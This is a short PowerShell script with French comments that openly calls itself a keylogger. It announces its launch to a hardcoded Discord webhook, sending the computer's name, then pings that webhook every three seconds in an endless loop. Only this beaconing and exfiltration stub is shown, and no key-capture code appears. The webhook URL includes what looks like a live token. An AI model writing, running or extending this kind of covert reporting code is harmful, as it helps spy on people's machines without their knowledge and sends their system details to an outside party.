$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"

# Message de démarrage
iwr $webhook -Method Post -Body (@{content="Keylogger lancé sur $env:COMPUTERNAME – boucle ping toutes les 3 sec"} | ConvertTo-Json) -ContentType 'application/json' | Out-Null

# Boucle infinie de ping toutes les 3 secondes
while ($true) {
    Start-Sleep -Seconds 3
    iwr $webhook -Method Post -Body (@{content="PING – $env:COMPUTERNAME est toujours vivant – $(Get-Date -Format 'HH:mm:ss')"} | ConvertTo-Json) -ContentType 'application/json' | Out-Null
}
